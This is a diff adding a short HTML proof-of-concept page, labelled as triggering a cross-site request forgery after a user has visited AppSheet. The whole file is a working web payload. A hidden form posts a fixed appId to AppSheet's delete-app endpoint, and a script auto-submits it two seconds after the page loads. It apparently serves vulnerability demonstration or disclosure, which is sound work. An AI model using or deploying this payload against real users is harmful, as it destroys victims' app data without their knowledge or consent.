@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Triggering CSRF after user visited AppSheet</h2>
+    <form id="csrfForm" action="https://www.appsheet.com/template/deleteappdef" method="POST">
+      <input type="hidden" name="appId" value="075ef5d4-78d3-41b-ab97-29d5c33214a9" />
+    </form>
+
+    <script>
+      setTimeout(() => {
+        document.getElementById('csrfForm').submit();
+      }, 2000); // Delay to simulate realistic interaction
+    </script>
+  </body>
+</html>
